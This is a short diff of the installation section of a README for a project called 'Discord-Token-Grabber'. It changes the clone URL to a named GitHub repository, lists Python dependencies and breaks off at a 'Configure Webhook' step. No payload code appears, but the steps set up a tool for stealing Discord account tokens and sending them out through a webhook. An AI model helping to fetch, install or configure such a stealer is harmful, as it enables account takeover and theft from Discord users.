@@ -41,8 +41,8 @@
 ## 📥 Installation & Usage
 
 ```bash
-git clone https://github.com/yourusername/discord-token-grabber.git
-cd discord-token-grabber
+git clone https://github.com/blaxkmiradev/Discord-Token-Grabber.git
+cd Discord-Token-Grabber
 Install Dependencies
 Bashpip install pycryptodome pywin32 requests
 Configure Webhook
